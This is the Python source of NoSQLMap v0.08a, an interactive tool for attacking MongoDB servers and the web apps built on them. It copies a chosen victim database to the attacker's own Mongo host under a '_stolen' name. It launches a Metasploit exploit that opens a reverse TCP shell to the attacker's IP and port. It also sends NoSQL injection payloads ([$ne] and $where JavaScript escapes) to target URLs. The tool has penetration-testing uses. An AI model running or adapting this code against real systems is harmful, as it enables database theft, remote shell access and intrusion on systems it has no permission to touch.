#!/usr/bin/python
#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys
import string
import random
import os
import httplib2
import urllib
import pymongo
import subprocess

#Set a list so we can track whether options are set or not
global optionSet
optionSet = [False,False,False,False,False,False]


def mainMenu():
	select = True
	while select:
		os.system('clear')
		print "NoSQLMap v0.08a-by Russell Butturini(tcstool@gmail.com)"
		print "\n"
		print "1-Set options (do this first)"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			options()

		elif select == "2":
			if optionSet[0] == True:
				netAttacks(victim)
			else:
				raw_input("Target not set! Check options.  Press enter to continue...")
				mainMenu()
			
		
		elif select == "3":
			if (optionSet[0] == True) and (optionSet[2] == True):	
				webApps()
			
			else:
				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
				mainMenu()

		elif select == "4":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global victim
	global webPort
	global uri
	global httpMethod
	global myIP
	global myPort
	
	
	if optionSet[0] == False:
		victim = "Not Set"
	if optionSet[1] == False:
		webPort = 80
	if optionSet[2] == False:
		uri = "Not Set"
	if optionSet[3] == False:
		httpMethod = "GET"
	if optionSet[4] == False:
		myIP = "Not Set"
	if optionSet[5] == False:
		myPort = "Not Set"
	
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP (Current: " + str(victim) + ")"
		print "2-Set web app port (Current: " + str(webPort) + ")" 
		print "3-Set URI Path (Current: " + str(uri) + ")"
		print "4-Set HTTP Request Method (GET/POST)"
		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
		print "6-Set shell listener port (Current: " + str(myPort) + ")"
		print "7-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			victim = raw_input("Enter the host IP/DNS name: ")
			print "Target set to " + victim + "\n"
			optionSet[0] = True
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "HTTP port set to " + webPort + "\n"
			optionSet[1] = True
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "URI Path set to " + uri + "\n"
			optionSet[2] = True
			options()

		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					optionSet[3] = True
					options()

				elif httpMethod == "2":
					print "POST request set"
					optionSet[3] = True
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
			print "Shell IP set to " + myIP + "\n"
			optionSet[4] = True
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			optionSet[5] = True
			options()
			
		elif select == "7":
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	global dbList
	
	try:
		conn = pymongo.MongoClient(target,27017)
		print "MongoDB port open on " + target + ":27017!"
		mgtOpen = True
	
	except:
		print "MongoDB port closed."
		
		
	mgtUrl = "http://" + target + ":28017"
	
	
	try:		
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
	
		else:
			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
	except:
		print "MongoDB web management closed."
	
	if mgtOpen == True:

		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"

		print "List of databases:"
		dbList = conn.database_names()
		print "\n".join(dbList)

		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
		
		if getShell == "y" or getShell == "Y":
			#try:
			proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
			#except:
			#	print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
	
	raw_input("Press enter to continue...")
	return()
		
	
	
def webApps():
	paramName = []
	paramValue = []
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			
			print "App is up! Got response length of " + str(normLength) + ".  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
		injLen = int(len(urllib.urlopen(neqUri).read()))
		print "Got response length of " + str(injLen) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
		
		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print " Injecting " + whereStrUri
		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print " Injecting " + whereIntUri
		
		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
		whereIntDelta = abs(whereIntLen - randLength)
		#print "whereIntLen debug: " + str(whereIntLen)
		#print "whereIntDelta debug: " + str(whereIntDelta)
		
		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
		#Start a single record attack
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + whereOneStr
		
		if (str(urllib.urlopen(whereOneStr).read()).find('Error') != -1):
			whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
			whereOneStrDelta = abs(whereOneStrLen - randLength)
		else:
			whereOneStrDelta = 0
			
		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + whereOneInt
		
		if (str(urllib.urlopen(whereOneInt).read()).find('Error') != -1):
			whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
			whereOneIntDelta = abs(whereIntLen - randLength)
		
		else:
			whereOneIntDelta = 0
			
		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
		
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
	
	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	chars = string.ascii_letters + string.digits
	return ''.join(random.choice(chars) for x in range(size))

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global neqUri
	global whereStrUri
	global whereIntUri
	global whereOneStr
	global whereOneInt
	
	split_uri = origUri.split("?")
	params = split_uri[1].split("&")
	
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
	print "List of parameters:"
	print "\n".join(paramName)
	
	injOpt = raw_input("Which parameter should we inject?")
	evilUri = split_uri[0] + "?"
	neqUri = split_uri[0] + "?"
	whereStrUri = split_uri[0] + "?"
	whereIntUri = split_uri[0] + "?"
	whereOneStr = split_uri[0] + "?"
	whereOneInt = split_uri[0] + "?"
	x = 0
	
	for item in paramName:		
		if paramName[x] == injOpt:
			evilUri += paramName[x] + "=" + randValue + "&"
			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			whereIntUri += paramName[x] + "=a; return db.a.find(); var dummy='!" + "&"
			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy='!" + "&"
		else:
			evilUri += paramName[x] + "=" + paramValue[x] + "&"
			neqUri += paramName[x] + "=" + paramValue[x] + "&"
			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
			
		x += 1		
	#Clip the last & off
	evilUri = evilUri[:-1]
	neqUri = neqUri[:-1]
	whereStrUri = whereStrUri[:-1]
	whereIntUri = whereIntUri[:-1]
	whereOneStr = whereOneStr[:-1]
	whereOneInt = whereOneInt[:-1]
	
	return evilUri

def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		myDBConn = pymongo.MongoClient(myDB,27017)
		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
		mainMenu()								
	
mainMenu()